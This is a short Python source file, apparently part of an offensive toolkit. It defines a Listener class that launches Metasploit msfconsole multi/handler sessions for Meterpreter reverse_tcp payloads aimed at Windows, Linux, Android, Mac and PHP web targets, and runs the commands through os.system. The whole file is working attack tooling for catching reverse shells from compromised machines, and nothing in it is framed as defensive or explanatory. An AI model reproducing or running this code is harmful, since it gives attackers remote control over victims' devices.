import os 
class Listener():
    def __init__(self,lhost,lport):
        self.lhost = lhost
        self.lport = lport
    
    listener = {
        "windows" : "msfconsole -q -x 'use multi/handler;set  payload  windows/meterpreter/reverse_tcp;set lhost {};set lport {};exploit'",
        "linux"   : "msfconsole -q -x 'use multi/handler;set  payload  linux/x86/meterpreter_reverse_tcp;set lhost {};set lport {};exploit'",
        "android" : "msfconsole -q -x 'use multi/handler;set  payload  android/meterpreter/reverse_tcp;set lhost {};set lport {};exploit'",
        "mac"     : "msfconsole -q -x 'use multi/handler;set  payload  java/meterpreter/reverse_tcp;set lhost {};set lport {};exploit'",
        "web"     : "msfconsole -q -x 'use multi/handler;set  payload  php/meterpreter/reverse_tcp;set lhost {};set lport {};exploit'"

     }
    
    def initListener(self,opt):
        if opt == 1:
            os.system(self.listener["windows"].format(self.lhost,self.lport))
        elif opt ==2:
            os.system(self.listener["linux"].format(self.lhost,self.lport))
        elif opt ==3:
            os.system(self.listener["android"].format(self.lhost,self.lport))
        elif opt ==4:
            os.system(self.listener["mac"].format(self.lhost,self.lport))
        elif opt ==5:
            os.system(self.listener["web"].format(self.lhost,self.lport))
